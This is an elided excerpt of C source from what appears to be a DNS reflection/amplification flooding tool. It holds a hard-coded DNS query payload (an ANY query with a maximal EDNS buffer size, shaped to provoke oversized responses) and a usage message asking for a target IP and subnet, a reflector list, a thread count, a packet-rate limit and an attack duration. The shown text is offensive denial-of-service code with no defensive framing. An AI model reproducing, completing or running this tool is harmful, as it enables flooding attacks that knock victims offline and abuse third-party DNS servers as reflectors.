...
static const char PAYLOAD[] =
    ...
    "\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00";
...
void print_usage(char *prog_name) {
  fprintf(stdout, "%s <target IP>/<subnet suffix> <port, 0 for random> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n",
            prog_name);
  return;
}
